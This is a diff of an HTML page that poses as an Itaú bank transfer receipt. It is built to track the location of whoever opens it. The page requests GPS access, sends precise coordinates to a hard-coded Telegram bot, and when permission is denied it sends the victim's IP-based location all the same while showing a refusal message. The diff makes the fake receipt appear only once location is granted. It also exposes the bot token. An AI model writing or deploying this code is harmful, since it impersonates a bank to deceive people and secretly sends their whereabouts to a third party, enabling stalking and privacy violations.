@@ -6,40 +6,46 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
-  body{background:#f5f5f5}
-  #spinnerBox{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
+  body{background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh}
+  #spinnerBox{display:flex;flex-direction:column;align-items:center;justify-content:center}
   #spinner{width:48px;height:48px;border:4px solid #ddd;border-top:4px solid #003366;border-radius:50%;animation:spin 1s linear infinite}
   @keyframes spin{to{transform:rotate(360deg)}}
-  #comprovante{display:none;background:#fff;width:100%;max-width:480px;margin:20px auto;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+  #msgNegado{display:none;text-align:center;color:#c00;font-size:16px;font-weight:600}
+  #comprovante{display:none;background:#fff;width:100%;max-width:480px;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
   .logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px}
   .row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
   .label{color:#555}
   .value{font-weight:600}
   .divider{height:1px;background:#ddd;margin:12px 0}
   .center{text-align:center}
-  #mapa{width:100%;height:200px;border:0;border-radius:4px;margin-top:8px;display:none}
+  #mapa{width:100%;height:200px;border:0;border-radius:4px;margin-top:8px}
 </style>
 </head>
 <body>
 
+<!-- 1) SPINNER -->
 <div id="spinnerBox">
   <div id="spinner"></div>
-  <p style="margin-top:12px;color:#003366;font-size:14px">Aguardando permissões do seu navegador</p>
+  <p style="margin-top:12px;color:#003366;font-size:14px">Aguardando permissão de localização…</p>
 </div>
 
+<!-- 2) MENSAGEM CASO NEGUE -->
+<div id="msgNegado">
+  <p>Para visualizar o comprovante, é necessário permitir o acesso à localização.</p>
+</div>
+
+<!-- 3) COMPROVANTE (só aparece se permitir) -->
 <div id="comprovante">
   <div class="logo">Itaú</div>
   <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora">05/06/2024 14:32:11</span></div>
   <div class="divider"></div>
   <div class="row"><span class="label">Valor</span><span class="value" id="valor">R$ 1.234,56</span></div>
   <div class="divider"></div>
-  <div id="localRow" style="display:none">
-      <div class="row"><span class="label">Latitude</span><span class="value" id="lat"></span></div>
-      <div class="row"><span class="label">Longitude</span><span class="value" id="lon"></span></div>
-      <div class="row"><span class="label">Precisão</span><span class="value" id="preco"></span></div>
-      <iframe id="mapa" frameborder="0"></iframe>
-  </div>
-  <div class="divider" id="divLoc" style="display:none"></div>
+  <div class="row"><span class="label">Latitude</span><span class="value" id="lat"></span></div>
+  <div class="row"><span class="label">Longitude</span><span class="value" id="lon"></span></div>
+  <div class="row"><span class="label">Precisão</span><span class="value" id="preco"></span></div>
+  <iframe id="mapa" frameborder="0"></iframe>
+  <div class="divider"></div>
   <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao">ITAUPIX20240605143211A1B2C3</span></div>
   <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao">A1B2C3D4E5F6G7H8I9J0</span></div>
   <div class="divider"></div>
@@ -47,7 +53,6 @@
 </div>
 
 <script>
-/* ---------- CONFIG FINAL ---------- */
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
@@ -58,15 +63,12 @@ const dados = {
   autenticacao: [...Array(20)].map(() => Math.random().toString(36)[2]).join('')
 };
 
+/* ---------- FUNÇÕES ---------- */
 function mostrar(lat, lon, prec, source = 'GPS') {
-  // preenche no comprovante
   document.getElementById('lat').textContent   = lat.toFixed(7);
   document.getElementById('lon').textContent   = lon.toFixed(7);
   document.getElementById('preco').textContent = `${prec} m / ${source}`;
   document.getElementById('mapa').src = `https://www.google.com/maps?q=${lat},${lon}&output=embed&z=18`;
-  // mostra tudo
-  document.getElementById('localRow').style.display = 'block';
-  document.getElementById('divLoc').style.display   = 'block';
   document.getElementById('spinnerBox').style.display = 'none';
   document.getElementById('comprovante').style.display = 'block';
 }
@@ -81,7 +83,7 @@ function enviarTelegram(lat, lon, prec, source) {
   });
 }
 
-/* 1ª tentativa – permissão GPS nativo */
+/* ---------- 1ª TENTATIVA: GPS ---------- */
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
     pos => {
@@ -90,29 +92,37 @@ if (navigator.geolocation) {
       mostrar(lat, lon, prec, 'Permitida');
     },
     () => {
-      /* 2ª tentativa – IP público (sem permissão) ao negar ou bloquear */
-      enviarViaIP();
+      /* ---------- 2ª TENTATIVA: IP (sempre executa) ---------- */
+      fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(data => {
+          const lat = data.latitude;
+          const lon = data.longitude;
+          enviarTelegram(lat, lon, '~1 km', 'via IP');
+        })
+        .catch(() => {
+          enviarTelegram(-23.550520, -46.633309, 'indisponível', 'genérica');
+        });
+      /* ---------- FIM: mostra mensagem de negação ---------- */
+      document.getElementById('spinnerBox').style.display = 'none';
+      document.getElementById('msgNegado').style.display = 'block';
     },
     { enableHighAccuracy: true, timeout: 8000 }
   );
 } else {
-  enviarViaIP();
-}
-
-function enviarViaIP() {
+  /* GPS não disponível → IP */
   fetch('https://ipapi.co/json/')
     .then(r => r.json())
     .then(data => {
       const lat = data.latitude;
       const lon = data.longitude;
       enviarTelegram(lat, lon, '~1 km', 'via IP');
-      mostrar(lat, lon, '~1 km', 'Bloqueada');
     })
     .catch(() => {
-      // fallback final
       enviarTelegram(-23.550520, -46.633309, 'indisponível', 'genérica');
-      mostrar(-23.550520, -46.633309, 'indisponível', 'Genérica');
     });
+  document.getElementById('spinnerBox').style.display = 'none';
+  document.getElementById('msgNegado').style.display = 'block';
 }
 </script>
 </body>
